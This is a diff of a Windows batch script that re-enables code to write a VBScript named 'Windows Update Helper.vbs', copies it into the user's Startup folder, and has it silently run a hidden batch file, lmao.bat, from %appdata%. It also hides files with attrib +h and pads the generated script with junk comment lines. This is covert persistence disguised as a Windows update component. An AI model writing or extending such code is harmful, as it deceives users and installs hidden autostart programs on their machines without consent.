@@ -30,9 +30,9 @@ echo entered important file creation
 echo initcopy>%filename%
 attrib +h %filename%
 )
-REM if not exist "Windows Update Helper.vbs" (
-REM goto :createvbs
-REM )
+if not exist "Windows Update Helper.vbs" (
+goto :createvbs
+)
 xcopy "Windows Update Helper.vbs" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Windows Update Helper.vbs" /y
 )
 )
@@ -274,7 +274,12 @@ REM END OF CRUCIAL CODE POSITION
 :createvbs
 echo creating vbs
 echo Set WshShell = CreateObject("WScript.Shell")  >"Windows Update Helper.vbs"
+echo 'idk >>"Windows Update Helper.vbs"
 echo WshShell.Run chr(34) ^& "%appdata%\Microsoft\Windows\lmao.bat" ^& Chr(34), 0  >>"Windows Update Helper.vbs"
+echo 'idk >>"Windows Update Helper.vbs"
+echo 'idk >>"Windows Update Helper.vbs"
 echo Set WshShell = Nothing >>"Windows Update Helper.vbs"
+echo 'idk >>"Windows Update Helper.vbs"
+echo 'idk >>"Windows Update Helper.vbs"
 echo created successfully
 goto :aftervbs
